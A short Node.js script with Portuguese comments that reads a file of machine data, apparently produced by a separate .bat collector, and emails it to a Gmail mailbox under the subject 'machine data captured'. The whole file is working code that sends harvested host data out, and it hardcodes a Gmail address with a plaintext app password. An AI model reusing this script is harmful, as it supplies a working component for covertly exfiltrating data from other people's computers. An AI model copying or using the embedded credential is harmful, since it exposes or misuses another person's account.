const nodemailer = require('nodemailer');
const fs = require('fs');

// Lê os dados do arquivo gerado pelo script .bat
let dados;
try {
  dados = fs.readFileSync('dados.txt', 'utf8').trim(); // Leitura do arquivo e remoção de espaços extras
  if (!dados) {
    throw new Error('Dados não encontrados no arquivo dados.txt');
  }
} catch (err) {
  console.error('Erro ao ler o arquivo dados.txt:', err);
  process.exit(1); // Termina o script se houver erro ao ler o arquivo
}

// Cria um transportador (transporter) para enviar o email usando o Gmail
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'derickcampossantos1@gmail.com', // Seu e-mail
    pass: 'cisi zrmz lnyg qtta' // Sua senha ou senha de aplicativo
  }
});

// Configuração do email (de, para, assunto, corpo)
const mailOptions = {
  from: 'derickcampossantos1@gmail.com',
  to: 'derickcampossantos1@gmail.com',
  subject: 'Dados da Máquina Capturados',
  text: `Os dados capturados são:\n\n${dados}` // Corpo do e-mail com os dados capturados
};

// Envia o e-mail
transporter.sendMail(mailOptions, (error, info) => {
  if (error) {
    console.log('Erro ao enviar o email:', error);
  } else {
    console.log('Email enviado com sucesso:', info.response);
  }
});
